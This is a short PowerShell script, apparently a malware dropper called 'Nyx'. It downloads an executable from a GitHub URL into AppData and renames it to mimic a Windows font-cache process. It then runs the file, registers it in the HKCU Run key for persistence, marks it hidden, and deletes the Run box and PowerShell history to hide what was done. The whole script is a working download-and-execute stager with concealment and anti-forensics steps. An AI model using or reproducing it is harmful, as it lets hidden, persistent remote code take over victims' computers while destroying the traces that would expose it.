# Nyx - Z8JT3CMC

# Create folder for Nyx
New-Item -Path "$env:APPDATA" -Name "Z8JT3CMC" -ItemType Directory

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/Z8JT3CMC/Z8JT3CMC.exe -OutFile "$env:APPDATA\Z8JT3CMC\Z8JT3CMC.exe"

# Change Nyx name
Rename-Item -Path "$env:APPDATA\Z8JT3CMC\Z8JT3CMC.exe" -NewName "PresentationFondCache.exe"

# Run Nyx
& "$env:APPDATA\Z8JT3CMC\PresentationFondCache.exe"

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "Z8JT3CMC" `
-Value "$env:APPDATA\Z8JT3CMC\PresentationFondCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:APPDATA\Z8JT3CMC\PresentationFondCache.exe" -Force
$FILE.attributes='Hidden'

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
